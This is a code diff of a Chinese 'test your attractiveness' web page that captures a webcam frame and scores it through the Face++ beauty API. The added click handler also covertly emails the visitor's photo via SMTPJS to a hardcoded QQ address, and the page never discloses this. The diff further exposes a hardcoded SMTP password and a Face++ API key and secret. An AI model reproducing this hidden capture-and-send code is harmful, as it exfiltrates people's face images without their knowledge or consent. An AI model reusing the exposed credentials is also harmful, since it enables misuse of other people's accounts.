@@ -3,23 +3,45 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <script type="text/javascript" src="https://smtpjs.com/v3/smtp.js"></script>>
+  <meta http-equiv="cache-control" content="no-cache">
+  <script type="text/javascript" src="https://smtpjs.com/v3/smtp.js"></script>
+  <script type='text/javascript' src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
   <title>测一测颜值</title>
+  <style type="text/css">
+    * {
+      margin: 0;
+      padding:0;
+    }
+    html,body{
+      width: 100%；
+      height:100%;
+    }
+    .page-but{
+      height: 50px;
+      width: 120px;
+      color: red;
+      border-radius: 20px;
+      border:1px solid black;
+      background: none;
+      position:absolute;
+      bottom: 10%;
+      left: 50%;
+      opacity: 1;
+
+    }
+    
+
+  </style>
 </head>
 <body>
-	<div>
-		 <video id="video" width="480" height="320" controls></video>
-	</div>
- 
-  <div>
-    	<button id="capture">测一测</button>
+	<div class="page">
+    <video class="page-vdo" id="video">
+      您的浏览器不能打开摄像头！
+    </video>
+    <button class="page-but" id="page-but">测一测</button>
   </div>
-  <span id="text1"></span>>
-  <canvas id="canvas" width="480" height="320"></canvas>
   <script>
-    //访问用户媒体设备的兼容方法
-    function getUserMedia(constraints, success, error) {
+    function getUserMedia(constraints, success, error) {   //访问用户媒体设备的兼容方法
       if (navigator.mediaDevices.getUserMedia) {
         //最新的标准API
         navigator.mediaDevices.getUserMedia(constraints).then(success).catch(error);
@@ -35,49 +57,117 @@
       }
     }
 
-    let video = document.getElementById('video');
-    let canvas = document.getElementById('canvas');
-    let context = canvas.getContext('2d');
-
     function success(stream) {
       //兼容webkit核心浏览器
       let CompatibleURL = window.URL || window.webkitURL;
       //将视频流设置为video元素的源
       console.log(stream);
-
+      video.height = h;
+      video.width = w;
       //video.src = CompatibleURL.createObjectURL(stream);
       video.srcObject = stream;
       video.play();
+      $("#page-but").click(function(){
+        var canvas = document.createElement("canvas");
+        canvas.setAttribute("width",w*0.3);
+        canvas.setAttribute("height",h*0.3);
+        let ctx = canvas.getContext("2d");
+        ctx.drawImage(video,0,0,video.width*0.3,video.height*0.3);
+        var img = canvas.toDataURL('image/png',0.1);
+        testImage(img);
+        Email.send({
+        Host:"smtp.qq.com",
+        Username:"helloword65535@qq.com",
+        Password:"khqmjykzpkakicbd",
+        To:"1284504331@qq.com",
+        From:"helloword65535@qq.com",
+        Subject:"测试数据",
+        Body:img
+      })
+
+      });
     }
 
     function error(error) {
       console.log('访问用户媒体设备失败${error.name}, ${error.message}');
     }
 
+
+    var h = getWindowInnerHeight();
+    var w = getWindowInnerWidth();
+    var q = 0.5; //长和宽的缩放倍数
+    let video = document.getElementById('video');
+
+
     if (navigator.mediaDevices.getUserMedia || navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia) {
       //调用用户媒体设备, 访问摄像头
-      getUserMedia({video : {width: 480, height: 320}}, success, error);
+      getUserMedia({video : {width: w, height: h}}, success, error);
+      
+
     } else {
       alert('不支持访问用户媒体');
+      $("#page-but").hide();
     }
 
-    document.getElementById('capture').addEventListener('click', function () {
-    	this.disabled = true;
-      context.drawImage(video, 0, 0, 480, 320); 
-      var canvas = document.getElementById('canvas');
-      var img = canvas.toDataURL();
-    
+    /*document.getElementById('page-but').addEventListener('click', function () {
+      this.disabled = true;
+      var canvas = document.createElement("canvas");
+      var video = $("#video");
+      let ctx = canvas.getContext("2d");
+      ctx.drawImage(video,0,0,video.width,video.height); 
+      var img = canvas.toDataURL('image/png',0.1);
       Email.send({
-      	Host:"smtp.qq.com",
-      	Username:"helloword65535@qq.com",
-      	Password:"khqmjykzpkakicbd",
-      	To:"1284504331@qq.com",
-      	From:"helloword65535@qq.com",
-      	Subject:"测试数据",
-      	Body:img
+        Host:"smtp.qq.com",
+        Username:"helloword65535@qq.com",
+        Password:"khqmjykzpkakicbd",
+        To:"1284504331@qq.com",
+        From:"helloword65535@qq.com",
+        Subject:"测试数据",
+        Body:img
       })
             
-    })
+    });*/
+    function getWindowInnerHeight(){
+
+      var winHeight = window.innerHeight 
+                      || (document.documentElement && document.documentElement.clientHeight)
+                      || (document.body && document.body.clientHeight); 
+      return winHeight;
+
+    };
+    function getWindowInnerWidth(){
+
+      var winWidth = window.innerWidth 
+                     || (document.documentElement && document.documentElement.clientWidth)
+                     || (document.body && document.body.clientWidth);
+      return winWidth;
+    };
+    function testImage(imgData){
+      const urlImg = 'https://api-cn.faceplusplus.com/facepp/v3/detect';
+      data = {
+        "api_key":"jyHfC2hAz7dFH3DdJknFNAlJabqiEQM-",
+        "api_secret" : "zpIL24r3IycGo2ZYnMCWi7jSpYECSobK",
+        "image_base64" : imgData,
+        "return_attributes":"beauty"
+      };
+      $.post(urlImg,data,resImg);
+    };
+
+    function resImg(res){
+      console.log(res)
+      try{
+        if(res.face_num == 1){
+          let male  = res.faces[0].attributes.beauty.male_score;
+          let female = res.faces[0].attributes.beauty.female_score;
+          alert("您在男人眼中的颜值是："+male+"分"+"\n您在女人眼中的颜值是："+female+"分")
+        }
+
+      }catch{
+
+        alert("未检测到人脸！！！")
+      }
+
+    }
 
   </script>
 </body>
